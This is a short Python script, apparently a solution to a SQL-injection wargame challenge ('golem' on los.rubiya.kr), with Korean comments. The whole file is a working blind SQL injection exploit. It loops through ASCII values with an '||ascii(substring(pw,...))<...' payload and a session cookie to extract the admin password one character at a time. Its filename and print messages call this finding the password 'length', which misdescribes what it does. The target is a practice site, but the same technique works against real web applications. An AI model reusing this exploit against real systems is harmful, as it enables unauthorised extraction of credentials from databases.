# made by TOR
# pwlength.py version 1.0

import urllib.request
from urllib.parse import quote

# 답의 저장할 배열 선언
b = []   

# 패스워드의 길이가 8이므로 크게 이중 for문을 
# 48 ~ 122 까지 아스키 코드 값을 반복함
for j in range(1, 9, 1):
            for i in range(48,123):
                        
                        # 사용할 쿼리 제작 
                        url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw="
                        query = "'||ascii(substring(pw,"+str(j)+",1))<"+str(i)+"-- -"
                        query = quote(query)
                        new_url = url + query
                        
                        # 쿠키 값 추가 해줌
                        req = urllib.request.Request(new_url)
                        req.add_header("Cookie", "<자신의 쿠키값>")
                        response = urllib.request.urlopen(req)
                        
                        # 참일 경우 배열에 추가하고 반복문 중지
                        if str(response.read()).find("Hello admin") != -1:
                                    print("Found length!! =>"+str(chr(i)))
                                    b.append(str(chr(i-1))) # 사용한 쿼리가 < 사용하므로 -1로 진짜 답                     
                                    break
                        else:
                                    print("{}".format(i))
      
print("Finish")
print("password:", b)
